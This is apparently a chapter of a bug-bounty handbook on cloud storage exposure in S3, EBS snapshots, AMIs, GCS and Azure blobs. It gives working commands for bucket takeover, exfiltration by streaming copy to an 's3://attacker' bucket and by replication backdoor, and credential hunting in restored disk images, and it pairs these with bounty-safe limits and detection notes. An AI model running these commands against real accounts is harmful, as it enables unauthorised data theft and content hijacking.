# Ch4: Storage Exposure — S3, EBS, AMIs, GCS, Azure Blobs

Source: `aws/exploitation/` (orphaned CloudFront takeover, s3_server_access_logs, s3_streaming_copy, s3-bucket-replication-exfiltration), `aws/enumeration/` (loot_public_ebs_snapshots, discover_secrets_in_public_aims), `aws/post_exploitation/s3_acl_persistence.md`, `gcp/general-knowledge/gcp-buckets.md`, `azure/` (anonymous-blob-access, soft-deleted-blobs). Storage misconfig is the most common cloud bounty class — the tests are cheap, the impact is usually data read or hosted-content control.

## S3 — read, write, take over

- **Probe**: `aws s3 ls s3://<bucket> --no-sign-request` (or just `https://<bucket>.s3.amazonaws.com`). List+read is the classic leak finding.
- **Safe write test**: upload a marker *you own*, then delete it — `echo poc | aws s3 cp - s3://<bucket>/bugbounty-test.txt && aws s3 rm s3://<bucket>/bugbounty-test.txt`. A writable bucket that serves JS/SDK content is a supply-chain finding (the Twilio TaskRouter incident: public `s3:PutObject` let an attacker overwrite a served JS SDK).
- **Dangling-origin takeover**: deleted bucket + live CNAME/CloudFront origin → create the bucket name in your account → serve content on the victim domain (cookies, JS context, phishing). Since late 2023 CloudFront returns `NotFound` *without* the bucket name (was `NoSuchBucket`) — recover the name via DNS history, source maps, or the error body of other endpoints.
- **ACL vs policy**: public access can come from a bucket policy (`Principal: *`), an object ACL, or canned grants `AUTHENTICATED USERS` (any AWS principal anywhere) / `ANY USER` (anonymous). Public Access Block stops *public* ACLs but not grants to a specific external account — and new buckets post-April-2023 have ACLs disabled by default.
- **Account ID from bucket**: see ch01 (`s3-account-search`).

## Data-movement techniques (report the capability, don't run on targets)

- **Streaming copy** — `aws s3 cp s3://victim/x - | aws s3 cp - s3://attacker/x` moves objects without local disk; a VPC-endpoint policy pinning `principalOrgId` blocks it (cross-region destination may sidestep the endpoint).
- **Server access logs** — with `s3:GetObject` on *your own* logging-enabled bucket, even *denied* requests log the key name (≤1024 bytes) and User-Agent → smuggles data out through a permitted action.
- **Replication backdoor** — `s3:PutReplicationConfiguration` + an assumable role copies all current+future objects to an attacker bucket (needs versioning both sides; Batch Operations catches existing objects).

## Disks & images

- **Public EBS snapshots** — `aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids <acct>`; restore → attach → read filesystem for keys/source/db dumps. Zero-cost recon, huge signal.
- **Public AMIs** — `aws ec2 describe-images --owners <acct> --include-deprecated`; launch in your account, then `find / -name credentials`, `-name id_rsa`, `grep -ri 'password\|secret\|key'`, or truffleHog/gitleaks. Same finding class as snapshots, different artifact.
- **Detection note**: public-share events show as `ec2:ModifySnapshotAttribute`/`ModifyImageAttribute` with `groups:all` — cite in reports so blue teams can query their own trails.

## GCP & Azure

- **GCS buckets** — near-identical model: `https://storage.googleapis.com/<bucket>`; discovery with digininja's CloudStorageFinder `google_finder.rb` + wordlists. Watch `allUsers`/`allAuthenticatedUsers` bindings.
- **Azure containers** — three access levels: Private, Blob (need full URL), Container (anonymous listing!). Listing URL: `https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list`; MicroBurst `Invoke-EnumerateAzureBlobs -Base <name>` brute-forces container names.
- **Soft-deleted blobs** — default 7-day retention: deleted-but-recoverable blobs still hold the "removed" SSH key or dump; Storage Explorer → "Active and soft deleted blobs" → Undelete.
- **Keys & connection strings** — storage account keys/conn strings/SAS URIs leak via config files and source (`conn_str` in code); a full-account connection string bypasses container scoping entirely → Azure Storage Explorer.

**Bounty-safe validation**: for public storage, a listing screenshot + one benign object fetch (or your marker write+delete for write perms) is the PoC ceiling. Never exfiltrate or enumerate personal/customer data — count objects, don't read them.
